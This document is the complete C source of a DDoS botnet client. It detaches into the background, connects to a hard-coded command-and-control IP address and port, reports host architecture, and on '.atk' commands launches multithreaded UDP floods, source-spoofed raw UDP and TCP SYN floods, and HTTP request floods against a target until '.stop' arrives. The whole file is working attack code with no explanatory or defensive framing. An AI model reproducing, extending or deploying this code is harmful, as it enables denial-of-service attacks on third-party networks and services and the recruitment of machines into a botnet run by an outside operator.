#include <time.h>
#include <pthread.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <errno.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/utsname.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <netdb.h>

#define BUFFER_SIZE 4096
#define CNC_IP "45.134.39.212"
#define CNC_PORT 4087
#define MAX_PACKET 65535
#define MAX_THREADS 500
#define DEFAULT_THREADS 100
#define DEFAULT_SIZE 1400
#define DEFAULT_PPS 1000000

static int sock = -1;
static int running = 1;
static char arch[64] = "unknown";
static char version[16] = "1.1";
static int is_root = 0;

typedef struct {
    char target[64];
    int port;
    int duration;
    int packet_size;
    int thread_id;
    int threads;
    int pps;
    char host[128];
    char path[256];
} attack_args_t;

static attack_args_t current_attack = {0};
volatile int attack_running = 1;
volatile unsigned long long packets_sent = 0;
volatile unsigned long long bytes_sent = 0;
pthread_t *attack_threads = NULL;
attack_args_t *thread_args = NULL;
int active_threads = 0;

const char *user_agents[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0"
};

#define NUM_USER_AGENTS (sizeof(user_agents) / sizeof(user_agents[0]))

void daemonize() {
    pid_t pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);
    setsid();
    pid = fork();
    if (pid > 0) exit(EXIT_SUCCESS);
    umask(0);
    chdir("/");
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
}

void get_arch() {
    struct utsname uname_data;
    if (uname(&uname_data) == 0) {
        snprintf(arch, sizeof(arch), "%s_%s", uname_data.machine, uname_data.sysname);
    } else {
        strcpy(arch, "linux_x86_64");
    }
}

void check_root() {
    is_root = (geteuid() == 0);
}

unsigned short checksum(unsigned short *buffer, int size) {
    unsigned long sum = 0;
    while (size > 1) {
        sum += *buffer++;
        size -= 2;
    }
    if (size == 1) sum += *(unsigned char *)buffer;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

void random_payload(unsigned char *buffer, int size) {
    for (int i = 0; i < size; i++) {
        buffer[i] = rand() & 0xFF;
    }
}

uint32_t random_ip() {
    uint32_t ip;
    do {
        ip = (rand() & 0xFF) << 24 | (rand() & 0xFF) << 16 | (rand() & 0xFF) << 8 | (rand() & 0xFF);
    } while (ip == 0x0100007F || ip == 0x0A000000 || ip == 0xAC100000 || ip == 0xC0A80000);
    return ip;
}

void build_http_request(char *buffer, char *host, char *path, int size, int ua_index) {
    snprintf(buffer, size,
        "GET %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: %s\r\n"
        "Accept: */*\r\n"
        "Accept-Encoding: gzip, deflate\r\n"
        "Connection: keep-alive\r\n"
        "Cache-Control: no-cache\r\n"
        "\r\n", path, host, user_agents[ua_index % NUM_USER_AGENTS]);
}

void *udp_flood(void *arg) {
    attack_args_t *args = (attack_args_t *)arg;
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) return NULL;

    int bufsize = 256 * 1024 * 1024;
    setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));

    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->port);
    inet_pton(AF_INET, args->target, &target_addr.sin_addr);

    int packet_size = args->packet_size > 65507 ? 65507 : args->packet_size;
    if (packet_size < 64) packet_size = 64;

    char packet[MAX_PACKET];
    time_t end_time = time(NULL) + args->duration;
    int pps_per_thread = args->pps / active_threads + 10;
    uint64_t start_time = time(NULL) * 1000000ULL;
    int packets_this_sec = 0;

    while (attack_running && time(NULL) < end_time) {
        random_payload((unsigned char *)packet, packet_size);
        sendto(sockfd, packet, packet_size, 0, (struct sockaddr *)&target_addr, sizeof(target_addr));
        packets_sent++;
        bytes_sent += packet_size;
        packets_this_sec++;

        if (packets_this_sec >= pps_per_thread) {
            uint64_t now = time(NULL) * 1000000ULL;
            if (now - start_time < 1000000ULL) usleep(1000000ULL - (now - start_time));
            packets_this_sec = 0;
            start_time = time(NULL) * 1000000ULL;
        }
    }
    close(sockfd);
    return NULL;
}

void *udp_raw_flood(void *arg) {
    attack_args_t *args = (attack_args_t *)arg;
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sockfd < 0) return NULL;

    int one = 1;
    setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    int bufsize = 256 * 1024 * 1024;
    setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));

    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->port);
    inet_pton(AF_INET, args->target, &target_addr.sin_addr);

    char packet[MAX_PACKET];
    time_t end_time = time(NULL) + args->duration;
    int pps_per_thread = args->pps / active_threads + 10;
    uint64_t start_time = time(NULL) * 1000000ULL;
    int packets_this_sec = 0;

    while (attack_running && time(NULL) < end_time) {
        int payload_size = args->packet_size;
        if (payload_size > 65507 - 28) payload_size = 65507 - 28;
        if (payload_size < 64) payload_size = 64;

        int packet_size = sizeof(struct iphdr) + sizeof(struct udphdr) + payload_size;

        struct iphdr *ip = (struct iphdr *)packet;
        struct udphdr *udp = (struct udphdr *)(packet + sizeof(struct iphdr));
        unsigned char *data = (unsigned char *)(packet + sizeof(struct iphdr) + sizeof(struct udphdr));

        ip->ihl = 5; ip->version = 4; ip->tos = 0;
        ip->tot_len = htons(packet_size);
        ip->id = htons(rand() & 0xFFFF);
        ip->frag_off = 0; ip->ttl = 255; ip->protocol = IPPROTO_UDP;
        ip->saddr = random_ip();
        ip->daddr = target_addr.sin_addr.s_addr;
        ip->check = 0;

        udp->source = htons(1024 + (rand() % 64511));
        udp->dest = htons(args->port);
        udp->len = htons(sizeof(struct udphdr) + payload_size);
        udp->check = 0;

        random_payload(data, payload_size);
        ip->check = checksum((unsigned short *)packet, packet_size);

        sendto(sockfd, packet, packet_size, 0, (struct sockaddr *)&target_addr, sizeof(target_addr));
        packets_sent++;
        bytes_sent += packet_size;
        packets_this_sec++;

        if (packets_this_sec >= pps_per_thread) {
            uint64_t now = time(NULL) * 1000000ULL;
            if (now - start_time < 1000000ULL) usleep(1000000ULL - (now - start_time));
            packets_this_sec = 0;
            start_time = time(NULL) * 1000000ULL;
        }
    }
    close(sockfd);
    return NULL;
}

void *tcp_raw_flood(void *arg) {
    attack_args_t *args = (attack_args_t *)arg;
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sockfd < 0) return NULL;

    int one = 1;
    setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    int bufsize = 256 * 1024 * 1024;
    setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));

    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->port);
    inet_pton(AF_INET, args->target, &target_addr.sin_addr);

    char packet[MAX_PACKET];
    time_t end_time = time(NULL) + args->duration;
    int pps_per_thread = args->pps / active_threads + 10;
    uint64_t start_time = time(NULL) * 1000000ULL;
    int packets_this_sec = 0;

    while (attack_running && time(NULL) < end_time) {
        struct iphdr *ip = (struct iphdr *)packet;
        struct tcphdr *tcp = (struct tcphdr *)(packet + sizeof(struct iphdr));

        int packet_size = sizeof(struct iphdr) + sizeof(struct tcphdr);

        ip->ihl = 5; ip->version = 4; ip->tos = 0;
        ip->tot_len = htons(packet_size);
        ip->id = htons(rand() & 0xFFFF);
        ip->frag_off = 0; ip->ttl = 255; ip->protocol = IPPROTO_TCP;
        ip->saddr = random_ip();
        ip->daddr = target_addr.sin_addr.s_addr;
        ip->check = 0;

        tcp->source = htons(1024 + (rand() % 64511));
        tcp->dest = htons(args->port);
        tcp->seq = rand();
        tcp->ack_seq = 0;
        tcp->doff = 5;
        tcp->syn = 1;
        tcp->window = htons(65535);
        tcp->check = 0;
        tcp->urg_ptr = 0;

        ip->check = checksum((unsigned short *)packet, packet_size);

        sendto(sockfd, packet, packet_size, 0, (struct sockaddr *)&target_addr, sizeof(target_addr));
        packets_sent++;
        bytes_sent += packet_size;
        packets_this_sec++;

        if (packets_this_sec >= pps_per_thread) {
            uint64_t now = time(NULL) * 1000000ULL;
            if (now - start_time < 1000000ULL) usleep(1000000ULL - (now - start_time));
            packets_this_sec = 0;
            start_time = time(NULL) * 1000000ULL;
        }
    }
    close(sockfd);
    return NULL;
}

void *http_flood(void *arg) {
    attack_args_t *args = (attack_args_t *)arg;
    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->port);
    inet_pton(AF_INET, args->target, &target_addr.sin_addr);

    char request[4096];
    int ua_counter = rand() % NUM_USER_AGENTS;
    time_t end_time = time(NULL) + args->duration;
    int pps_per_thread = args->pps / active_threads + 10;
    uint64_t start_time = time(NULL) * 1000000ULL;
    int packets_this_sec = 0;

    while (attack_running && time(NULL) < end_time) {
        build_http_request(request, args->host, args->path, sizeof(request), ua_counter++);

        int conn = socket(AF_INET, SOCK_STREAM, 0);
        if (conn >= 0) {
            fcntl(conn, F_SETFL, O_NONBLOCK);
            connect(conn, (struct sockaddr *)&target_addr, sizeof(target_addr));
            send(conn, request, strlen(request), 0);
            close(conn);
            packets_sent++;
            bytes_sent += strlen(request);
            packets_this_sec++;
        }

        if (packets_this_sec >= pps_per_thread) {
            uint64_t now = time(NULL) * 1000000ULL;
            if (now - start_time < 1000000ULL) usleep(1000000ULL - (now - start_time));
            packets_this_sec = 0;
            start_time = time(NULL) * 1000000ULL;
        }
    }
    return NULL;
}

void stop_attack() {
    attack_running = 0;
    if (attack_threads) {
        free(attack_threads);
        attack_threads = NULL;
    }
    if (thread_args) {
        free(thread_args);
        thread_args = NULL;
    }
    active_threads = 0;
}

void start_attack(char *cmd) {
    char target[64], method[32], host[128];
    int port, duration, threads, pps, size;
    sscanf(cmd, ".atk %63s %d %d %31s %d %d %d", target, &port, &duration, method, &threads, &pps, &size);

    if (threads > MAX_THREADS) threads = MAX_THREADS;
    if (pps > 1500000) pps = 1500000;
    if (size > 65507) size = 65507;
    if (size < 64) size = 64;

    attack_running = 1;
    packets_sent = 0;
    bytes_sent = 0;

    strcpy(current_attack.target, target);
    current_attack.port = port;
    current_attack.duration = duration;
    current_attack.packet_size = size;
    current_attack.threads = threads;
    current_attack.pps = pps;
    strcpy(current_attack.host, target);
    strcpy(current_attack.path, "/");

    struct hostent *he = gethostbyname(target);
    if (he) {
        strcpy(current_attack.target, inet_ntoa(*(struct in_addr*)he->h_addr_list[0]));
    }

    void *(*attack_func)(void *) = NULL;

    if (is_root) {
        if (strcasecmp(method, "udp") == 0) attack_func = udp_raw_flood;
        else if (strcasecmp(method, "tcp") == 0) attack_func = tcp_raw_flood;
        else if (strcasecmp(method, "http") == 0) attack_func = http_flood;
    } else {
        if (strcasecmp(method, "udp") == 0) attack_func = udp_flood;
        else if (strcasecmp(method, "http") == 0) attack_func = http_flood;
    }

    if (!attack_func) return;

    active_threads = threads;
    attack_threads = malloc(threads * sizeof(pthread_t));
    thread_args = malloc(threads * sizeof(attack_args_t));

    for (int i = 0; i < threads; i++) {
        memcpy(&thread_args[i], &current_attack, sizeof(attack_args_t));
        thread_args[i].thread_id = i;
        pthread_create(&attack_threads[i], NULL, attack_func, &thread_args[i]);
        pthread_detach(attack_threads[i]);
    }
}

void execute_command(char* cmd) {
    cmd = strtok(cmd, "\r\n");
    if (!cmd) return;

    if (strcmp(cmd, "PING") == 0) send(sock, "PONG\n", 5, 0);
    else if (strncmp(cmd, ".stop", 5) == 0) stop_attack();
    else if (strncmp(cmd, ".atk", 4) == 0) start_attack(cmd);
}

int connect_to_cnc() {
    struct sockaddr_in server_addr;
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(CNC_PORT);
    inet_pton(AF_INET, CNC_IP, &server_addr.sin_addr);

    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        close(sock);
        sock = -1;
        return -1;
    }

    char hbt[256];
    snprintf(hbt, sizeof(hbt), "HBT|%s|%s\n", arch, version);
    send(sock, hbt, strlen(hbt), 0);
    return 0;
}

void reconnect_loop() {
    char buffer[BUFFER_SIZE];
    while (running) {
        if (sock < 0) {
            if (connect_to_cnc() < 0) { sleep(5); continue; }
        }

        fd_set readfds;
        FD_ZERO(&readfds);
        FD_SET(sock, &readfds);
        struct timeval tv = {20, 0};

        if (select(sock + 1, &readfds, NULL, NULL, &tv) > 0) {
            int bytes = recv(sock, buffer, sizeof(buffer)-1, 0);
            if (bytes <= 0) {
                close(sock); sock = -1; continue;
            }
            buffer[bytes] = '\0';
            char* line = strtok(buffer, "\n");
            while (line) {
                execute_command(line);
                line = strtok(NULL, "\n");
            }
        } else {
            char hbt[256];
            snprintf(hbt, sizeof(hbt), "HBT|%s|%s\n", arch, version);
            send(sock, hbt, strlen(hbt), 0);
        }
    }
}

int main() {
    daemonize();
    signal(SIGPIPE, SIG_IGN);
    srand(time(NULL) ^ getpid());
    get_arch();
    check_root();
    reconnect_loop();
    return 0;
}
